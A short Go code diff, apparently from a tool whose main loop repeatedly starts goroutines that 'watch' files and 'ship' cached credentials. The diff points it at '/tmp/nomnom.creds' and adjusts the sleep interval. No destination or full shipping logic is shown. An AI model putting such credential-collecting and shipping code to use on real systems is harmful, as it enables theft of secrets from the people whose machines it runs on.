@@ -17,7 +17,7 @@ func ship(c cred_cache.CredCache, min int) {
 }
 
 func main() {
-	files := []string{"filepath:type", "file2:type"}
+	files := []string{"/tmp/nomnom.creds"}
 	min := 5
 	h, _ := os.Hostname()
 
@@ -26,7 +26,7 @@ func main() {
 		Credentials: []string{},
 	}
 	for {
-		time.Sleep(2)
+		time.Sleep(2000)
 		go watch(files, c) // "thread" to watch
 		go ship(c, min)    // "thread" to ship
 	}
